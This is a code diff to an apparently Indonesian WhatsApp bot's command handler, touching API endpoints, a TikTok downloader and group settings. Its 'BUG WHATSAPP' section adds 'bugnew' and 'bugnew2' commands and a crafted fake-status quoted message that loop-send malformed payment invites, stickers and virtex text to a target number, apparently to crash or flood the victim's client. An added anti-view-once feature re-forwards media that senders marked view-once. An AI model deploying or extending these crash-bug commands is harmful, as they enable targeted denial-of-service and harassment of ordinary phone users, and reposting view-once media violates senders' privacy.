@@ -72,6 +72,7 @@ let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
 let nteval = JSON.parse(fs.readFileSync('./database/antieval.json'))
 let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
 let antisticker = JSON.parse(fs.readFileSync('./database/antisticker.json'))
+let antiviewonce = JSON.parse(fs.readFileSync('./database/viewonce.json'))
 const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
 const thumb = fs.readFileSync(`./image/lol.jpg`)
 const virusgambar = fs.readFileSync(`./image/virgam.jpeg`)
@@ -117,6 +118,7 @@ const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
 const AntiEval = m.isGroup ? nteval.includes(from) : false
 const antiWame = m.isGroup ? ntwame.includes(from) : false
 const AntiSticker = m.isGroup ? antisticker.includes(from) : false
+const AntiViewOnce = m.isGroup ? antiviewonce.includes(from) : false
 const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
 const isPremgc = m.isGroup ? premgc.includes(from) : false
 const isBan = banned.includes(m.sender)
@@ -341,6 +343,27 @@ contextInfo:{mentionedJid:[sender]}
 }
 }
 }}
+//BUG NEW
+const newbugaha = {
+"key": { 
+"fromMe": false,
+"participant": '0@s.whatsapp.net',
+"remoteJid": 'status@broadcast' 
+},
+message: {
+"listResponseMessage": {
+title: `ShinChan Uwu`
+}}
+}
+async function XeonyCrashy(dgxeon,chat) {
+conn.sendMessage(chat, {
+document: {url: './config.js'},
+mimetype: `image/null`,
+fileName: `tes` ,
+caption: `tes`,
+}, {quoted: newbugaha })
+}
+//end bug functions
 //===================SHINCHAN XD=========================//
 if (vn) {
 let allct = await store.chats.all().map(v => v.id)
@@ -1711,6 +1734,15 @@ if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Virtex Terdeteks
         }
     }
   }
+        //antiviewonce
+    if ( AntiViewOnce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
+    	if (m.isBaileys && m.fromMe) return
+        let val = { ...m }
+        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
+        delete msg[Object.keys(msg)[0]].viewOnce
+        val.message = msg
+        await conn.sendMessage(m.chat, { forward: val }, { quoted: m })
+    }
 // Respon Cmd with media
 if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
 let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
@@ -2702,9 +2734,10 @@ if (!text) return m.reply('Apa yang bisa saya bantu?')
   let error23;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-    let ainero = await fetchJson(`https://aemt.me/v2/gpt4?text=${text}`)
+    let airealtime = await fetchJson(`https://rest.dimasbotzz.my.id/api/ai/gptrealtime?q=${text}&realtime=true`)
+    let chatgpt = await airealtime.result.response
 conn.sendMessage(m.chat, {
-    text: ainero.result, 
+    text: chatgpt, 
     contextInfo: {
     externalAdReply :{
     mediaUrl: 'https://instagram.com/shinchan.senpai', 
@@ -3094,7 +3127,7 @@ if (!isPremgc && !isCreator) return replytolak(premiumgc)
 if (!text) return paycall(`${prefix + command} Masukan Prompt Nya Kak><`)
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-let response = await fetchJson(`http://api.dimasbotzz.my.id/api/ai/render3d?prompt=${text}`)
+let response = await fetchJson(`https://rest.dimasbotzz.my.id/api/ai/render3d?prompt=${text}`)
 //await conn.sendImage(m.chat, response.result, donatur, m)
 await conn.sendMessage(m.chat, { image: { url: response.result }, caption: `${done}`}, { quoted: m })
 } catch (error) {
@@ -3108,7 +3141,7 @@ if (!isPremgc && !isCreator) return replytolak(premiumgc)
 if (!text) return paycall(`${prefix + command} Masukan Prompt Nya Kak><`)
 try {
   await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-  let res = await fetchJson(`http://api.dimasbotzz.my.id/api/text2img/bing-image2?prompt=${text}`);
+  let res = await fetchJson(`https://rest.dimasbotzz.my.id/api/text2img/bing-image2?prompt=${text}`);
   if (res.result?.length) {
     for (let i = 0; i < res.result?.length; i++) {
      // await conn.sendImage(m.chat, res.data[i], done, m);
@@ -3529,17 +3562,18 @@ await m.reply(`Hai @${m.sender.split('@')[0]} Audio akan Dikirim dalam obrolan p
             replyerror(`Error: ${errornya}`);
         };
 break
-/*case 'ttimg': case 'tiktokslide': case 'ttslide': {
+case 'ttimg': case 'tiktokslide': case 'ttslide': {
         if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
         if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
         let error19;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-        let res = await fetchJson(`https://vihangayt.me/download/tiktokimg?url=${args[0]}`)
+        let res = await fetchJson(`https://rest.dimasbotzz.my.id/api/downloader/tiktokSlide?url=${args[0]}`)
+        let anuttimg = res.result
 
-           // for (let tt of res.data) {
-           for (let i = 0; i < res.data.length; i++) {
-               await conn.sendImage(m.chat, res.data[i], done, m)
+           for (let tt of anuttimg.image) {
+           //for (let i = 0; i < res.result.length; i++) {
+               await conn.sendImage(m.chat, tt, done, m)
             // await conn.sendFile2(m.chat, tt, '', done, m);
             }
                               } catch (er) {
@@ -3550,8 +3584,8 @@ await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 					}
 					}
             }
-break*/
-case 'ttimg': case 'tiktokslide': case 'ttslide': {
+break
+/*case 'ttimg': case 'tiktokslide': case 'ttslide': {
         if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
         if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
 try {
@@ -3573,7 +3607,7 @@ const tiktokData = await tryServer1(args[0]);
         replyerror(`Yah Proses Gagal:(`);
     }
             }
-break
+break*/
 case 'tiktoknowm2': case 'ttnowm2': case 'tiktok2': case 'tt2': {
 if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
 if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
@@ -5274,8 +5308,9 @@ ${listnya}`
         let mek = await ani.json()
        // await conn.sendFile2(m.chat, mek.url, "", `${done}`, m)
        await conn.sendImage(m.chat, mek.url, done, m)
-    } catch (e) {
-        await m.reply(error)
+    } catch (error) {
+    console.error(error);
+        await m.reply(`Error Dari Servernya Bwang`);
     }
 }
 break
@@ -6108,6 +6143,36 @@ await conn.sendMessage(from, {text: done }, {quoted: m})
 }
 break
 //========================BUG WHATSAPP=========================//
+case 'bugnew2': {
+if (!isCreator) return m.reply(`*khusus Owner*`)
+if (!args[0]) return paytod(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxx|4`)
+ let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+for (let i = 0; i < jumlah ; i++){
+conn.relayMessage(nomor,{
+"paymentInviteMessage": {
+serviceType: "UPI",
+expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
+}},{quoted: newbugaha})
+await sleep(3000)
+}
+paytod(`*Successfully sent Bug To ${nomor} Please pause for 3 minutes*`)
+}
+break
+case 'bugnew':{
+if (!isCreator) return m.reply(`*khusus Owner*`)
+ if (!args[0]) return paytod(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx|5`)
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+for (let i = 0; i < jumlah ; i++){
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
+await sleep(3000)
+}
+paytod(`*Berhasil mengirim Bug*`)
+}
+break
 case 'sendbug': {
 if (!isCreator) return m.reply(`*khusus Owner*`)
 let memek = text.split("|")[0]+'@s.whatsapp.net'
@@ -6141,7 +6206,9 @@ for (let i = 0; i < jumlah ; i++){
 }
 conn.relayMessage(nomor, call, {})
 await sleep(2000)
-conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
+await sleep(2000)
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
 await sleep(2000)
 conn.relayMessage(nomor, call, {})
 await sleep(2000)
@@ -6163,9 +6230,9 @@ for (let i = 0; i < jumlah ; i++){
 }
 conn.relayMessage(nomor, call, {})
 await sleep(2000)
-conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
 await sleep(2000)
-conn.relayMessage(nomor, call, {})
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
 await sleep(2000)
 }
 }
@@ -6177,7 +6244,7 @@ let nomor = memek.replace(" ", "")
 let jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
 for (let i = 0; i < jumlah ; i++){
-conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: shinuwu })
+conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: newbugaha })
 await sleep(60* secon)
 }
 }
@@ -6222,7 +6289,7 @@ var invite = generateWAMessageFromContent(num, proto.Message.fromObject({
 }
 }), { userJid: m.chat, quoted: fbugstik })
 conn.relayMessage(num, invite.message, { messageId: invite.key.id })
-await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: fbugtext})
+await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(60* secon)
 }
 }
@@ -6241,7 +6308,7 @@ var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
                   "message": `${weg} ${weg}`,
                   "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
 }
-}), { userJid: m.chat, quoted: fbugstik })
+}), { userJid: m.chat, quoted: newbugaha })
 conn.relayMessage(nomor, troli.message, { messageId: troli.key.id })
 await sleep(60* secon)
 }
@@ -6273,15 +6340,15 @@ let memek = text.split("|")[0]+'@s.whatsapp.net'
 let nomor = memek.replace(" ", "")
 let jumlah = text.split("|")[1]
 for (let i = 0; i < jumlah ; i++){
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
 }
 }
@@ -6292,15 +6359,15 @@ if (!isCreator) return m.reply(`*khusus Owner*`)
 let nomor = memek.replace(" ", "")
 let jumlah = text.split("|")[1]
 for (let i = 0; i < jumlah ; i++){
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
-conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
+conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
 await sleep(1000)
 }
 }
@@ -7159,6 +7226,42 @@ paycall('Sukses mematikan antilink Channel WhatsApp di grup ini')
   }
   }
   break
+case 'antisticker':{
+if (!isCreator) return m.reply(`*khusus Owner*`)
+if (!m.isGroup) return groupon(from)
+if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
+if (args.length < 1) return paytod('on/off?')
+if (args[0]  === 'on'){
+if (AntiSticker) return paycall(`Already activated`)
+antisticker.push(from)
+fs.writeFileSync('./database/antisticker.json', JSON.stringify(antisticker))
+paycall('Anti Sticker Activated')
+} else if (args[0] === 'off'){
+let antisticker1 = antisticker.indexOf(from)
+antisticker.splice(antisticker1, 1)
+fs.writeFileSync('./database/antisticker.json', JSON.stringify(antisticker))
+paycall('Anti Sticker deactivated')
+               }
+               }
+            break
+case 'antionce':{
+if (!isCreator) return m.reply(`*khusus Owner*`)
+if (!m.isGroup) return groupon(from)
+if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
+if (args.length < 1) return paytod('on/off?')
+if (args[0]  === 'on'){
+if (AntiViewOnce) return paycall(`Already activated`)
+antiviewonce.push(from)
+fs.writeFileSync('./database/viewonce.json', JSON.stringify(antiviewonce))
+paycall('Anti View Once Activated')
+} else if (args[0] === 'off'){
+let antionce1 = antiviewonce.indexOf(from)
+antiviewonce.splice(antionce1, 1)
+fs.writeFileSync('./database/viewonce.json', JSON.stringify(antiviewonce))
+paycall('Anti View Once deactivated')
+               }
+               }
+            break
   case 'antieval': {
 if (!isCreator) return m.reply(`*khusus Owner*`)
 if (!m.isGroup) return groupon(from)
